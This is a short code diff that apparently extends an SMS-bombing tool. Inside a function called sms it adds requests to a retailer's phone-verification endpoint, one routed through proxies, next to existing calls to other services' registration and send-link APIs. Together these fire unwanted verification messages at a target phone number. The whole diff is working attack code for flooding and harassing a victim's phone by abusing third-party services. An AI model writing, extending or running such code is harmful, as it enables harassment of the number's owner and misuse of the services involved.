@@ -333,6 +333,11 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{number}", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
 					num = number
 					num2=""
 					num2+="+"
@@ -654,6 +659,11 @@ def sms(prx, number, tm, code):
 						"phone": number
 					}
 					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
+				except:
+					pass
+
+				try:
+					requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{number}", json=payload)
 				except:
 					pass
 
